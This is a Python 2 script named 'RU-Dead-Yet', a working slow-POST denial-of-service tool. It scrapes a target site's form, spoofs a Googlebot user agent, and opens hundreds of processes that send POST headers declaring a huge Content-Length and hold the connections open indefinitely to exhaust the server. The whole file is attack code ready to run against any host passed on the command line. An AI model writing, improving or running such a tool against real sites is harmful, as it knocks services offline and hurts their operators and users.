#-*- coding:utf-8 -*-
import socket,multiprocessing,sys,random,argparse,requests
from BeautifulSoup import BeautifulSoup

def form_to_dict(form):
    form_dict = {
        'action' : form.get('action', ''),
        'inputs' : [],
    }

    for index, input_field in enumerate(form.findAll('input')):

        form_dict['inputs'].append({
            'name' : input_field.get('name', ''),
            'type' : input_field.get('type', ''),
        })
    return form_dict

def treat_response():
    response = requests.get(args.target)
    soup = BeautifulSoup(response.text)
    for form in soup.findAll('form'):
        forms = form_to_dict(form)
        break
    inputs = forms['inputs'][0]
    action_form = forms['action']
    name_input = inputs['name']
    inputs_to_use = []
    inputs_to_use.append(action_form)
    inputs_to_use.append(name_input)
    return inputs_to_use

def set_header(targett,user_agent,inputs):
    if user_agent is not None:
        agents = []
        with open(user_agent, 'rb') as ra:
            agents += ra.read().split('\n')
            ra.close()

        header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: {}\r\n{}=\r\n".format(inputs[0],targett,random.choice(agents),inputs[1])
        return header
    else:
        header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n{}=".format(inputs[0],targett,inputs[1])
        return header

def attack(targett,port,header):
    while True:
        sock = socket.socket()
        try:
            if 'http://' in targett:
                targett = targett.replace('http://', '')
            elif 'https://' in targett:
                targett = targett.replace('https://','')
            else:
                pass
            sock.connect((targett,port))
            print 'connected\n'
            sock.send(header)
            print 'header sended\n'
            sock.recv(1024)
            sock.recv(1024)
        except:
            print 'Host recusou as conexoes\n'

def arguments():
    global args
    parser = argparse.ArgumentParser(description="RU-Dead-Yet")
    parser.add_argument('-t', '--target', help="IP or Domain of Target", type=str)
    parser.add_argument('-p', '--port', help="Port of Target", default=80, type=int)
    parser.add_argument('-c', '--connections', help="Number of connections", default=200, type=int)
    parser.add_argument('-u', '--useragent', help="Path to text file with User Agents", default=None, type=str)
    args = parser.parse_args()
    if args.target == None:
        sys.exit(parser.print_help())

if __name__ == '__main__':
    conections = []
    arguments()
    try:
        for i in range(args.connections):
            attack_process = multiprocessing.Process(target=attack, args=(args.target,args.port,set_header(args.target,args.useragent,treat_response())))
            attack_process.start()
            conections.append(attack_process)
        for c in conections:
            c.join()
    except KeyboardInterrupt:
        for c in conections:
            c.terminate()
        for c in conections:
            c.join()
        sys.exit(0)
